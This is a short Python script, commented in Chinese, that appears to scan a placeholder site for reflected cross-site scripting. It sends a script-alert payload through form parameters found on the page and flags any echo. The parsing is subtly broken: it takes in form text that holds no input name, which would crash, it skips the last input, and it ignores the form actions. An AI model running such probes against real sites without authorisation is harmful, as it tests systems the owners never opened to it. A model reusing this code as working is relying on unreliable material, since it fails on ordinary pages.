import requests

# 定义目标网址和payload
target_url = 'http://example.com/index.php'
payload = '<script>alert("XSS!");</script>'

# 构造GET请求，检测是否存在XSS漏洞
def check_xss_get(param):
    url = target_url + '?' + param + '=' + payload
    response = requests.get(url)
    if payload in response.text:
        print('[+] XSS found in GET parameter: ' + param)

# 构造POST请求，检测是否存在XSS漏洞
def check_xss_post(param):
    data = {param: payload}
    response = requests.post(target_url, data=data)
    if payload in response.text:
        print('[+] XSS found in POST parameter: ' + param)

# 读取所有网页中的参数，检测是否存在XSS漏洞
def find_parameters():
    response = requests.get(target_url)
    params = response.text.split('<form')[1:]
    for param in params:
        if 'method="post"' in param:
            action = param.split('action="')[1].split('"')[0]
            inputs = param.split('<input')[:-1]
            for i in inputs:
                name = i.split('name="')[1].split('"')[0]
                check_xss_post(name)
        elif 'method="get"' in param:
            action = param.split('action="')[1].split('"')[0]
            inputs = param.split('<input')[:-1]
            for i in inputs:
                name = i.split('name="')[1].split('"')[0]
                check_xss_get(name)

find_parameters()
